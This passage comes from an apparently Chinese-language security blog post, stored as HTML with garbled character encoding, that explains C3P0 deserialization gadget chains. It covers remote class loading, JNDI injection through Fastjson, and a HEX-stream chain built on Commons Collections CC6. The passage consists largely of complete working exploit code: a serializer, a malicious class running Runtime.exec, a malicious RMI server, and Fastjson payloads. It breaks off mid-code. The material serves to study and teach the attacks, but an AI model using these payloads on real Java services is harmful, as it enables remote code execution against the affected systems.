class="hljs-comment">//åºåˆ—åŒ–æµå†™å…¥æ–‡ä»¶</span><br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;exp.bin&quot;</span>));<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(fos);<br>        oos.writeObject(poolBackedDataSourceBase);<br><br>    &#125;<br><br>    <span class="hljs-comment">//ååºåˆ—åŒ–</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Pool_Deserial</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;exp.bin&quot;</span>));<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(fis);<br>        objectInputStream.readObject();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;<br>        <span class="hljs-type">EXP_Loader</span> <span class="hljs-variable">exp_loader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EXP_Loader</span>();<br>        Pool_Serial(exp_loader);<br>        Pool_Deserial();<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>æ¶æ„ç±»</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br> <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">exp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">exp</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åå»èµ·ä¸€ä¸ª8888ç«¯å£çš„æœåŠ¡å™¨ï¼Œæ¶æ„ç±»æ”¾åœ¨æœåŠ¡å™¨ä¸‹å³å¯</p><p><img src="https://cdn.clown2024.cn/image-20241101194419904.png" alt="image-20241101194419904"></p><h2 id="jndiæ³¨å…¥"><a href="#JNDIæ³¨å…¥" class="headerlink" title="JNDIæ³¨å…¥"></a>JNDIæ³¨å…¥</h2><p>è¯¥é“¾å­ä¾èµ–äºFastjsonå’ŒJacksonååºåˆ—åŒ–æ¼æ´</p><p><strong>åˆ©ç”¨é“¾</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#ä¿®æ”¹jndiName<br>JndiRefConnectionPoolDataSource#setJndiName -&gt;<br>JndiRefDataSourceBase#setJndiName<br> <br>#JNDIè°ƒç”¨<br>JndiRefConnectionPoolDataSource#setLoginTimeout -&gt;<br>WrapperConnectionPoolDataSource#setLoginTimeout -&gt;<br>JndiRefForwardingDataSource#setLoginTimeout -&gt;<br>JndiRefForwardingDataSource#inner -&gt;<br>JndiRefForwardingDataSource#dereference() -&gt;<br>Context#lookup<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°åˆ©ç”¨é“¾éƒ½æ˜¯ä»setteræ–¹æ³•å¼€å§‹çš„ï¼Œæ‰€ä»¥å°±å¯ä»¥å¾ˆå¥½é…åˆfastjsonæˆ–è€…Jacksonåˆ©ç”¨é“¾</p><h3 id="æµç¨‹åˆ†æ"><a href="#æµç¨‹åˆ†æ-1" class="headerlink" title="æµç¨‹åˆ†æ"></a>æµç¨‹åˆ†æ</h3><p>å…¶æ¼æ´ç‚¹åœ¨äºJndiRefConnectionPoolDataSourceç±»ä¸­ï¼Œè¯¥ç±»æœ‰è®¸å¤šçš„setterå’Œgetteræ–¹æ³•ï¼Œå…¶ä¸­æˆ‘ä»¬å¯ä»¥é€šè¿‡setJndiNameæ–¹æ³•æ¥ç»™å±æ€§jndiNameèµ‹å€¼</p><p><img src="https://cdn.clown2024.cn/image-20241102001706522.png" alt="image-20241102001706522"></p><p>ä»–è¿™é‡Œè°ƒç”¨JndiRefConnectionPoolDataSource#setJndiNameæ–¹æ³•çš„æ—¶å€™ï¼Œä¼šå†è·³åˆ°JndiRefDataSourceBase#setJndiNameæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241102001802528.png" alt="image-20241102001802528"></p><p>ä¿®æ”¹äº†nameä¹‹åæˆ‘ä»¬å°±éœ€è¦å»è§¦å‘è°ƒç”¨ï¼Œåˆ©ç”¨åˆ°çš„æ˜¯JndiRefConnectionPoolDataSource#setLoginTimeoutæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241102002128576.png" alt="image-20241102002128576"></p><p>ç„¶åè°ƒç”¨WrapperConnectionPoolDataSource#setLoginTimeoutæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241102002251962.png" alt="image-20241102002251962"></p><p>è¿™é‡Œçš„getNestedDataSourceè¿”å›çš„æ˜¯JndiRefForwardingDataSourceï¼Œå› æ­¤è¿™é‡Œè°ƒç”¨çš„æœ€ç»ˆæ˜¯<code>JndiRefForwardingDataSource#setLoginTimeout</code></p><p><img src="https://cdn.clown2024.cn/image-20241102002633572.png" alt="image-20241102002633572"></p><p>ç„¶åå°±æ˜¯è¿›å…¥inner()æ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241102002706468.png" alt="image-20241102002706468"></p><p>åœ¨dereference()æ–¹æ³•è§¦å‘äº†jndiè°ƒç”¨</p><p><img src="https://cdn.clown2024.cn/image-20241102002741246.png" alt="image-20241102002741246"></p><h3 id="åˆ©ç”¨é“¾æ„é€ "><a href="#åˆ©ç”¨é“¾æ„é€ -1" class="headerlink" title="åˆ©ç”¨é“¾æ„é€ "></a>åˆ©ç”¨é“¾æ„é€ </h3><p>é€‰ä¸ªä½ç‰ˆæœ¬çš„fastjsonæ¥åšä¾‹å­</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.exp;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">import</span> java.sql.SQLException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNDI_Attack</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource\&quot;,&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;JndiName\&quot;:\&quot;rmi://127.0.0.1:1099/hello\&quot;, &quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;LoginTimeout\&quot;:0&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¶æ„rmiæœåŠ¡</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.exp;<br><br><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.rmi.Naming;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMI_Server</span> &#123;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">register</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        <span class="hljs-type">Reference</span> <span class="hljs-variable">reference</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;exp&quot;</span>,<span class="hljs-string">&quot;exp&quot;</span>,<span class="hljs-string">&quot;http://127.0.0.1:8888/&quot;</span>);<br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">refObjWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(reference);<br>        Naming.bind(<span class="hljs-string">&quot;rmi://127.0.0.1:1099/hello&quot;</span>,refObjWrapper);<br>        System.out.println(<span class="hljs-string">&quot;Registryè¿è¡Œä¸­......&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">RMI_Server</span>().register();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¶æ„ç±»ç”¨å‰é¢è¿œç¨‹ç±»åŠ è½½çš„é‚£ä¸ª</p><p><img src="https://cdn.clown2024.cn/image-20241103003238269.png" alt="image-20241103003238269"></p><h2 id="åˆ©ç”¨hexæµåŠ è½½ä»»æ„ç±»"><a href="#åˆ©ç”¨HEXæµåŠ è½½ä»»æ„ç±»" class="headerlink" title="åˆ©ç”¨HEXæµåŠ è½½ä»»æ„ç±»"></a>åˆ©ç”¨HEXæµåŠ è½½ä»»æ„ç±»</h2><p>è¯¥åˆ©ç”¨é“¾èƒ½å¤Ÿååºåˆ—åŒ–ä¸€ä¸²åå…­è¿›åˆ¶å­—ç¬¦ä¸²</p><p><strong>åˆ©ç”¨é“¾</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#è®¾ç½®userOverridesAsStringå±æ€§å€¼<br>WrapperConnectionPoolDataSource#setuserOverridesAsString -&gt;<br>WrapperConnectionPoolDataSourceBase#setUserOverridesAsString<br> <br>#åˆå§‹åŒ–ç±»æ—¶ååºåˆ—åŒ–åå…­è¿›åˆ¶å­—èŠ‚æµ<br>WrapperConnectionPoolDataSource#WrapperConnectionPoolDataSource -&gt;<br>C3P0ImplUtils#parseUserOverridesAsString -&gt;<br>SerializableUtils#fromByteArray -&gt;<br>SerializableUtils#deserializeFromByteArray -&gt;<br>ObjectInputStream#readObject<br></code></pre></td></tr></table></figure><h3 id="æµç¨‹åˆ†æ"><a href="#æµç¨‹åˆ†æ-2" class="headerlink" title="æµç¨‹åˆ†æ"></a>æµç¨‹åˆ†æ</h3><p>è¯¥é“¾å­çš„æˆå› æ˜¯å› ä¸ºWrapperConnectionPoolDataSourceçš„æ„é€ æ–¹æ³•ä¸­å¯¹å±æ€§userOverridesçš„èµ‹å€¼å­˜åœ¨å¼‚æ ·å†™æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241103222535119.png" alt="image-20241103222535119"></p><p>è¿™é‡Œè°ƒç”¨C3P0ImplUtils#parseUserOverridesAsStringæ–¹æ³•å°†userOverridesè§£ææˆStringï¼Œä½†userOverridesæœ¬èº«å°±æ˜¯Stringç±»å‹ï¼Œæˆ‘ä»¬è·Ÿè¿›å»çœ‹çœ‹è¿™ä¸ªæ–¹æ³•åšäº†ä»€ä¹ˆ</p><p><img src="https://cdn.clown2024.cn/image-20241103223316471.png" alt="image-20241103223316471"></p><p>è¿™é‡Œä¼šå°†userOverridesçš„HASM_HEADERå˜é‡åé¢çš„åå…­è¿›åˆ¶å­—ç¬¦ä¸²æˆªå–å‡ºæ¥ï¼ŒHASM_HEADERçš„å€¼ä¸ºâ€HexAsciiSerializedMapâ€ï¼Œè¿˜ä¼šå°†æœ€åä¸€ä½ç»™å»æ‰ï¼Œæ‰€ä»¥æˆ‘ä»¬åé¢è®¾ç½®å˜é‡çš„å€¼çš„æ—¶å€™è¦åŠ ä¸Šè¿™ä¸ªå­—ç¬¦ä¸²ï¼Œè€Œä¸”æœ€åä¸€ä½åŠ ä¸Šå¤šä¸€ä¸ªå­—ç¬¦æ¯”å¦‚â€;â€æ¥å ä½</p><p>ç„¶åè§£æè¯¥åå…­è¿›åˆ¶å­—ç¬¦ä¸²ä¸ºå­—èŠ‚æ•°ç»„ï¼Œå¹¶è°ƒç”¨SerializableUtils#deserializeFromByteArrayæ–¹æ³•æ¥å¤„ç†å­—èŠ‚æ•°ç»„ï¼Œç»§ç»­è·Ÿè¿›å»çœ‹çœ‹</p><p><img src="https://cdn.clown2024.cn/image-20241103224452045.png" alt="image-20241103224452045"></p><p>æ¬¸çœ‹åˆ°è¿™ä¸ªæ–¹æ³•å°±å¾ˆç†Ÿæ‚‰ï¼Œå­—é¢æ„æ€å°±æ˜¯ååºåˆ—åŒ–è¯¥å­—èŠ‚æ•°ç»„ï¼Œå†è·Ÿè¿›å»</p><p><img src="https://cdn.clown2024.cn/image-20241103224710588.png" alt="image-20241103224710588"></p><p>å°±å¯ä»¥çœ‹åˆ°ç›´æ¥è°ƒç”¨äº†readObjectæ–¹æ³•</p><h3 id="åˆ©ç”¨é“¾æ„é€ "><a href="#åˆ©ç”¨é“¾æ„é€ -2" class="headerlink" title="åˆ©ç”¨é“¾æ„é€ "></a>åˆ©ç”¨é“¾æ„é€ </h3><p>ä¸Šé¢çš„åˆ©ç”¨é“¾æ„é€ å°±å¾ˆç®€å•äº†ï¼Œç›´æ¥ç”¨cc6çš„å­—èŠ‚ç æ¥åšç¤ºä¾‹</p><p>è¿™é‡Œå°±ç›´æ¥ç”¨çš„æ«å¸ˆå‚…çš„expï¼Œä½¿ç”¨çš„æ˜¯fastjsonæ¥è§¦å‘åˆ©ç”¨é“¾</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.exp;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.beans.PropertyVetoException;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.io.StringWriter;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Hex_Attack</span> &#123;<br><br>    <span class="hljs-comment">//CC6çš„åˆ©ç”¨é“¾</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map <span class="hljs-title function_">CC6</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;<br>        <span class="hljs-comment">//ä½¿ç”¨InvokeTransformeråŒ…è£…ä¸€ä¸‹</span><br>        Transformer[] transformers=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        ChainedTransformer chainedTransformer=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        HashMap&lt;Object,Object&gt; hashMap1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        LazyMap lazyMap= (LazyMap) LazyMap.decorate(hashMap1,<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br><br>        TiedMapEntry tiedMapEntry=<span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap,<span class="hljs-string">&quot;abc&quot;</span>);<br>        HashMap&lt;Object,Object&gt; hashMap2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap2.put(tiedMapEntry,<span class="hljs-string">&quot;eee&quot;</span>);<br>        lazyMap.remove(<span class="hljs-string">&quot;abc&quot;</span>);<br><br><br>        <span class="hljs-comment">//åå°„ä¿®æ”¹LazyMapç±»çš„factoryå±æ€§</span><br>        Class clazz=LazyMap.class;<br>        Field factoryField= clazz.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        factoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        factoryField.set(lazyMap,chainedTransformer);<br><br>        <span class="hljs-keyword">return</span> hashMap2;<br>    &#125;<br><br><br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addHexAscii</span><span class="hljs-params">(<span class="hljs-type">byte</span> b, StringWriter sw)</span><br>    &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">ub</span> <span class="hljs-operator">=</span> b &amp; <span class="hljs-number">0xff</span>; <span class="hljs-comment">//è½¬æˆæ— ç¬¦å·æ•´æ•°</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">h1</span> <span class="hljs-operator">=</span> ub / <span class="hljs-number">16</span>;  <span class="hljs-comment">//è®¡ç®—é«˜ä½åå…­è¿›åˆ¶æ•°å­—</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">h2</span> <span class="hljs-operator">=</span> ub % <span class="hljs-number">16</span>;  <span class="hljs-comment">//è®¡ç®—åœ°ä½åå…­è¿›åˆ¶æ•°å­—</span><br>        sw.write(toHexDigit(h1)); <span class="hljs-comment">//è½¬æ¢æˆå­—ç¬¦ç„¶åå†™å…¥</span><br>        sw.write(toHexDigit(h2));<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">char</span> <span class="hljs-title function_">toHexDigit</span><span class="hljs-params">(<span class="hljs-type">int</span> h)</span><br>    &#123;<br>        <span class="hljs-comment">//é€ä¸ªå­—ç¬¦è¿›è¡Œè½¬æ¢</span><br>        <span class="hljs-type">char</span> out;<br>        <span class="hljs-keyword">if</span> (h &lt;= <span class="hljs-number">9</span>) out = (<span class="hljs-type">char</span>) (h + <span class="hljs-number">0x30</span>);<br>        <span class="hljs-keyword">else</span> out = (<span class="hljs-type">char</span>) (h + <span class="hljs-number">0x37</span>);<br>        <span class="hljs-comment">//System.err.println(h + &quot;: &quot; + out);</span><br>        <span class="hljs-keyword">return</span> out;<br>    &#125;<br><br>    <span class="hljs-comment">//å°†ç±»åºåˆ—åŒ–ä¸ºå­—èŠ‚æ•°ç»„</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] tobyteArray(Object o) <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bao</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(bao);<br>        oos.writeObject(o);<br>        <span class="hljs-keyword">return</span> bao.toByteArray();<br>    &#125;<br><br>    <span class="hljs-comment">//å­—èŠ‚æ•°ç»„è½¬åå…­è¿›åˆ¶</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">toHexAscii</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span><br>    &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">len</span> <span class="hljs-operator">=</span> bytes.length;<br>        <span class="hljs-type">StringWriter</span> <span class="hljs-variable">sw</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringWriter</span>(len * <span class="hljs-number">2</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; len; ++i)<br>            addHexAscii(bytes[i], sw);<br>        <span class="hljs-keyword">return</span> sw.toString();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, PropertyVetoException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">hex</span> <span class="hljs-operator">=</span> toHexAscii(tobyteArray(CC6()));<span class="hljs-comment">//è·å–åå…­è¿›åˆ¶å­—ç¬¦ä¸²</span><br>        System.out.println(hex);<br><br>        <span class="hljs-comment">//Fastjson&lt;1.2.47</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;1\&quot;:&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;val\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;,&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;2\&quot;:&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;userOverridesAsString\&quot;:\&quot;HexAsciiSerializedMap:&quot;</span>+ hex + <span class="hljs-string">&quot;;\&quot;,&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241103225728831.png" alt="image-20241103225728831"></p><p>ä½ç‰ˆæœ¬fastjsonä¹Ÿå¯ä»¥ç›´æ¥ç”¨ç®€å•ä¸€ç‚¹çš„payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">String payload = &quot;&#123;&quot; +<br>        &quot;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,&quot; +<br>        &quot;\&quot;userOverridesAsString\&quot;:\&quot;HexAsciiSerializedMap:&quot;+ hex + &quot;;\&quot;,&quot; +<br>        &quot;&#125;&quot;;<br></code></pre></td></tr></table></figure><p><strong>ç‰¹æ®Šçš„åœ°æ–¹</strong></p><p>ä½†æ ¹æ®ä¸Šé¢çš„åˆ©ç”¨æµç¨‹æ¥çœ‹ï¼Œå¦‚æœé…åˆfastjsonçš„é“¾å­ï¼Œè¿™é‡Œæˆ‘ä»¬çš„WrapperConnectionPoolDataSourceç±»è‡³å°‘éœ€è¦è°ƒç”¨ä¸¤æ¬¡æ„é€ æ–¹æ³•ï¼Œç¬¬ä¸€ä¸ªæ¬¡æ˜¯è°ƒç”¨æˆ‘ä»¬çš„setteræ–¹æ³•ï¼Œç¬¬äºŒæ¬¡æ˜¯è°ƒç”¨æ„é€ æ–¹æ³•è§¦å‘é“¾å­</p><p>å…³é”®çš„åœ°æ–¹å°±åœ¨ä»–çš„setUserOverridesAsStringæ–¹æ³•é‡Œé¢ï¼Œæˆ‘ä»¬å»çœ‹ä¸€ä¸‹</p><p><img src="https://cdn.clown2024.cn/image-20241103235801196.png" alt="image-20241103235801196"></p><p>å½“æˆ‘ä»¬è°ƒç”¨è¯¥setteræ—¶ï¼Œé¦–å…ˆä¼šä¸æ—§çš„<code>userOverridesAsString</code>å±æ€§æ¯”è¾ƒï¼Œè¿™é‡Œæ—§å€¼ä¸º<code>null</code>ï¼Œæ–°å€¼ä¸ºæˆ‘ä»¬æ„é€ çš„<code>userOverridesAsString</code>ï¼Œå› æ­¤è¿™é‡Œä¼šè¿›å…¥ifåˆ¤æ–­ã€‚</p><p>ä¸€è·¯è·Ÿè¿›æ–¹æ³•ï¼Œæœ€ç»ˆåˆ°<code>WrapperConnectionPoolDataSource#vetoableChange</code>æ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241104000506391.png" alt="image-20241104000506391"></p><p>è¿™é‡ŒpropNameå°±æ˜¯userOverridesAsStringï¼Œæˆ‘ä»¬ä¼šèµ°åˆ°è¿™ä¸ªåˆ¤æ–­é‡Œé¢ï¼Œç„¶åç›´æ¥è°ƒç”¨C3P0ImplUtils#parseUserOverridesAsStringæ–¹æ³•å¯¹æˆ‘ä»¬ä¼ å…¥çš„åå…­è¿›åˆ¶å­—ç¬¦ä¸²è¿›è¡Œè§£æï¼Œå°±å‡å°‘äº†ä¸€æ¬¡éœ€è¦è°ƒç”¨æ„é€ å‡½æ•°çš„æ“ä½œ</p><h1 id="c3p0ä¸å‡ºç½‘åˆ©ç”¨"><a href="#C3P0ä¸å‡ºç½‘åˆ©ç”¨" class="headerlink" title="C3P0ä¸å‡ºç½‘åˆ©ç”¨"></a>C3P0ä¸å‡ºç½‘åˆ©ç”¨</h1><p>C3P0ä¸å‡ºç½‘çš„åˆ©ç”¨æ¡ä»¶è¾ƒä¸ºè‹›åˆ»ï¼Œè€Œä¸”éœ€è¦å­˜åœ¨Tomcat8çš„ä¾èµ–ç¯å¢ƒ</p><p>è·Ÿjndié«˜ç‰ˆæœ¬ç»•è¿‡ç±»ä¼¼ï¼Œä½†æ˜¯jndié«˜ç‰ˆæœ¬ç»•è¿‡è¿˜æ²¡å­¦ï¼Œä½“ä¼šä¸åˆ°ï¼Œæ‰€ä»¥å…ˆç©ºä¸€ä¸‹åˆ°æ—¶å†è¡¥ğŸ«¡</p><p>åäºŒæœˆä»½æœ‰æœºä¼šæ¥è¡¥ä¸€ä¸‹äº†ğŸ«¡</p><p>jdniçš„é«˜ç‰ˆæœ¬ç»•è¿‡ä¸­ï¼Œæˆ‘ä»¬çŸ¥é“æœ‰ä¸€ç§æ–¹å¼å°±æ˜¯åˆ©ç”¨Tomcatçš„BeanFactoryçš„getObjectInstaceæ–¹æ³•ï¼Œæ¥è¿›è¡ŒELè¡¨è¾¾å¼çš„æ³¨å…¥</p><p>å›å¤´çœ‹å‰é¢è¿œç¨‹ç±»åŠ è½½ä¸­çš„ReferenceableUtils#referenceToObjectæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241203204529365.png" alt="image-20241203204529365"></p><p>æ¬¸å¯ä»¥å‘ç°ï¼Œè¿™é‡Œå®Œç¾çš„ç¬¦åˆjndié«˜ç‰ˆæœ¬ç»•è¿‡çš„æ–¹å¼ï¼Œåªè¦å°†è¿™ä¸ªFactoryè®¾ç½®ä¸ºBeanFactoryå³å¯ï¼Œç„¶åå°±å¯ä»¥åœ¨ä¸å‡ºç½‘çš„æƒ…å†µä¸‹è¿›è¡Œjndiæ³¨å…¥äº†</p><p>å…ˆå¯¼å…¥ä¸‹é¢ä¸‰ä¸ªç±»æ–¹ä¾¿åˆ©ç”¨æµ‹è¯•</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"> <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span 